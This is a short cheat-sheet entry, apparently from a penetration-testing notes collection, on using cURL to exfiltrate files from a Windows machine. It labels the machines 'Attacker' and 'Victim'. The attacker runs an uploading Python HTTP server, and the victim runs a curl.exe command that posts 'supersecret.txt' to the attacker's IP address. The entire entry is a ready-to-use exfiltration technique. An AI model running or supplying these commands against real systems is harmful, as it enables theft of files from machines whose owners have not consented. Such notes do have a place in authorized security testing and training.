# Name
cURL

## Usage
```
# Windows Victim uploading file using CMD:
# double backslashes are impt
# Windows 10 and Server 2019 has curl.exe built-in at c:\windows\system32\curl.exe

# On Attacker:
# https://raw.githubusercontent.com/Tallguy297/SimpleHTTPServerWithUpload/master/SimpleHTTPServerWithUpload.py
python3 SimpleHTTPServerWithUpload.py 80

# On Victim:
curl.exe -F 'file=@C:\\temp\\supersecret.txt' http://172.16.1.30
```

## Source
https://github.com/oss-dmg/curl-portable/raw/master/curl.exe
